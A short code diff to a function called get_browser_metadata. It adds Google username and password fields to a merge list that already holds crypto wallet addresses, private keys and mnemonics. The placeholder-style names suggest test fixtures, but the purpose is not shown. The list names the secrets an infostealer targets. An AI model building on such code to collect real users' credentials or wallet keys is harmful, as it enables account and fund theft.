@@ -55,6 +55,7 @@ def get_browser_metadata(dir_path: str):
         ("okx_eth_wallets", ["my_okx_eth_wallet_address", "my_okx_eth_wallet_private_key", "my_okx_eth_wallet_mnemonic"]),
         ("okx_solana_wallets",["my_okx_solana_wallet_address", "my_okx_solana_wallet_private_key", "my_okx_solana_wallet_mnemonic"]),
         ("metamask_eth_wallets",["my_metamask_solana_wallet_address", "my_metamask_solana_wallet_private_key", "my_metamask_solana_wallet_mnemonic"]),
+        ("google", ["google_username","google_password"]),
     ]
 
     for filename, keys in merge_plan:
